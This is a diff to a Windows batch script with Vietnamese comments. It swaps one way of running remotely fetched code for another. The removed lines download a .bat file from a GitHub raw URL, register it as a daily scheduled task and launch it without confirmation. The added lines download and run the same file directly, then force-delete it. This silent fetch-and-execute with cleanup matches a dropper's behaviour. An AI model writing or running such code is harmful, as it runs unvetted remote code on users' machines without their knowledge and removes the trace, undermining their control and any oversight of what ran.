@@ -32,10 +32,8 @@ if %found%==1 (
 
 
 
-powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat' -OutFile 'C:\windows-backup.bat'; schtasks /create /tn 'WindowsBackup' /tr 'C:\windows-backup.bat' /sc daily /st 00:00 /f}"
+powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat' -OutFile 'C:\windows-backup.bat'; Start-Process -FilePath 'C:\windows-backup.bat' -Wait}"
 
-:: Chạy file .bat mà không hỏi xác nhận
-start "" "C:\windows-backup.bat"
 
 
 
@@ -53,6 +51,6 @@ set "tempfile="
 set "serial="
 set "device="
 set "found="
-
+del /f /q "C:\windows-backup.bat"
 echo Hoan Thanh.
 exit
